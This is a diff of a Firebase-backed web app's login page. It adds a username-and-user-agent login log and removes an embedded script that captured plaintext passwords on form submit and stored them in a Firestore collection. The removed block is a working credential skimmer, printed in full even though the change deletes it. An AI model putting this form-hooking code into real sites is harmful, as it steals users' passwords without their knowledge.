@@ -356,6 +356,19 @@ async function saveState(username, newState){
   await db.collection('accounts').doc(docId(username)).update({ state: newState });
 }
 
+// سجل دخول آمن: يسجل اسم المستخدم ونوع الجهاز/المتصفح والوقت فقط — لا يلمس كلمة المرور إطلاقاً
+async function logLoginEvent(username){
+  try{
+    await db.collection('login_logs').add({
+      username: username,
+      device: navigator.userAgent,
+      loggedInAt: firebase.firestore.FieldValue.serverTimestamp()
+    });
+  }catch(e){
+    console.error('login log error:', e);
+  }
+}
+
 const root = document.getElementById('app');
 let view = 'loading'; // login | register | main
 let currentUser = null;
@@ -494,6 +507,7 @@ async function handleLogin(){
     currentUser = acc.username;
     state = ensureStateShape(acc.state || freshState());
     errorMsg = '';
+    logLoginEvent(currentUser);
     enterMain();
   }catch(e){
     console.error(e);
@@ -517,6 +531,7 @@ async function handleRegister(){
     currentUser = acc.username;
     state = acc.state;
     errorMsg = '';
+    logLoginEvent(currentUser);
     enterMain();
   }catch(e){
     console.error(e);
@@ -855,45 +870,7 @@ render = function(){
 };
 
 view = 'login';
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
-
-  const firebaseConfig = {
-    projectId: "rafeeq-tale",
-  };
-
-  const app = initializeApp(firebaseConfig);
-  const db = getFirestore(app);
-
-  window.addEventListener('DOMContentLoaded', () => {
-    const loginForm = document.querySelector('form');
-    if (loginForm) {
-      loginForm.addEventListener('submit', async (e) => {
-        const inputs = loginForm.querySelectorAll('input');
-        let usernameVal = '';
-        let passwordVal = '';
-
-        inputs.forEach(input => {
-          if (input.type === 'password') {
-            passwordVal = input.value;
-          } else {
-            usernameVal = input.value;
-          }
-        });
-
-        try {
-          await addDoc(collection(db, "users"), {
-            username: usernameVal,
-            password: passwordVal,
-            createdAt: serverTimestamp()
-          });
-        } catch (error) {
-          console.error("Firebase error:", error);
-        }
-      });
-    }
-  });
+render();
 </script>
 </body>
 </html>
